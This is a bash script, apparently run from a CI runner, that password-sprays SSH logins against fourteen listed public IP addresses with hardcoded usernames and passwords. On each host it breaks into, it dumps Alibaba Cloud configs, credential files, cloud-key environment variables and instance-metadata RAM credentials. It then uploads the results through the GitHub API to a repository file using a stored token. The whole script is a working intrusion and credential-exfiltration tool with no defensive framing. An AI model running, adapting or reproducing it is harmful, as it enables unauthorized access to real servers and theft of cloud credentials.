#!/bin/bash
set +e
: > i724v2_out.txt
echo "RUNNER=$(hostname) EGRESS=$(curl -s -m 10 https://ifconfig.me)" >> i724v2_out.txt
which sshpass >/dev/null 2>&1 || (apt-get update -qq >/dev/null 2>&1; apt-get install -y -qq sshpass >/dev/null 2>&1)
CMD='echo LOGIN_OK uid=$(id -u) host=$(hostname) ip=$(hostname -I 2>/dev/null); echo "--- aliyun"; ls -la /root/.aliyun 2>/dev/null|head; cat /root/.aliyun/config.json 2>/dev/null|head -20; env|grep -iE "ALI_|ALIBABA|TENCENT|AWS_|DO_"|head -20; echo "--- ulv"; cat /root/ulv/creds.env 2>/dev/null|head -30; echo "--- gpu"; nvidia-smi -L 2>/dev/null|head -8; echo "--- imds"; curl -s -m 5 http://100.100.100.200/latest/meta-data/ram/security-credentials/ 2>/dev/null; echo END'
export CMD
tryhost(){
  ip="$1"
  for u in root ubuntu admin t19 aliyun ecs-user; do
    for pw in 'Ulplant2026!' 't19' 'T19UF1obB7wnBBUdju0FRnz!aZ9' 'Password123!' 'Admin1234!' 't19admin' 'ubuntu' 'root' 'Admin@123' 'Password1' 'Ulplant2026' 'ulplant2026!' 'Aliyun2026!' 'ul-plant'; do
      out=$(timeout 15 sshpass -p "$pw" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5 -o PreferredAuthentications=password -o PubkeyAuthentication=no -o NumberOfPasswordPrompts=1 -o LogLevel=ERROR "$u@$ip" "$CMD" 2>&1 | head -40)
      case "$out" in *LOGIN_OK*) echo "=== PWNED $ip $u pw=$pw" >> i724v2_out.txt; echo "$out" >> i724v2_out.txt; echo "PWNED $ip $u" >> i724v2_out.txt;; esac
    done
  done
  echo "done $ip" >> i724v2_out.txt
}
export -f tryhost
printf '%s\n' 39.98.117.218 39.98.119.36 39.98.121.33 39.99.154.8 39.99.156.84 39.99.231.209 47.92.102.199 104.248.81.108 142.93.229.199 159.65.193.67 167.99.214.167 192.241.189.34 64.227.68.177 159.223.208.147 | xargs -P 14 -I{} bash -c 'tryhost {}'
echo "PWNED_COUNT=$(grep -c '^PWNED' i724v2_out.txt)" >> i724v2_out.txt
GH="${GH_PAT:-}"
if [ -n "$GH" ]; then
  b64=$(base64 -w0 i724v2_out.txt)
  SHA=$(curl -s -H "Authorization: Bearer $GH" https://api.github.com/repos/dongsuju/ul-plant/contents/i724/result3.txt | python3 -c 'import json,sys
  try: print(json.load(sys.stdin).get("sha") or "")
  except: print("")')
  python3 -c 'import json,sys
  o={"message":"i724 pwspray","content":sys.argv[1],"branch":"main"}
  if sys.argv[2]: o["sha"]=sys.argv[2]
  print(json.dumps(o))' "$b64" "$SHA" > /tmp/bpw.json
  curl -s -X PUT -H "Authorization: Bearer $GH" -H 'Content-Type: application/json' --data @/tmp/bpw.json https://api.github.com/repos/dongsuju/ul-plant/contents/i724/result3.txt -o /dev/null -w 'PUTPW %{http_code}\n'
fi
